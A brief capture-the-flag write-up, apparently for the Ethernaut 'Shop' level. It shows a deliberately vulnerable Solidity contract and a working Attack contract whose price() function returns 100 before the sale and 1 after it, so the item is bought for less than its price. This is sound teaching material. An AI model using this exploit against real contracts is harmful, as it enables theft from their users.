#   Level 21 Shop
實例地址：`0xAEeb0f24Fac17eeBc510d5338CD1CB1795e602a7`

##  題目說明
Сan you get the item from the shop for less than the price asked?

Things that might help:
Shop expects to be used from a Buyer
Understanding restrictions of view functions
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
```

##  POC
此合約限定了 Buyer 的 `price()` 只能讀取不能更改數值，但是我們可以使用 `isSold` 的值來判斷下一次需要回傳的數值，當 `isSold 為 false ` 我們需要回傳 100 才能過 `if` 的驗證，接下來收到當 `isSold 為 true ` 我回傳小於 100 數值即可。

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Shop {
    function isSold() external view returns(bool);
    function buy() external;
}

contract Attack{
    address public target;

    constructor(address _target){
        target = _target;
        
    }

    function price() public view returns (uint256){
        if(Shop(target).isSold() == false){
            return 100;
        }
        return 1;
    }

    function attack() public {
        Shop(target).buy();
    }
    
}
```
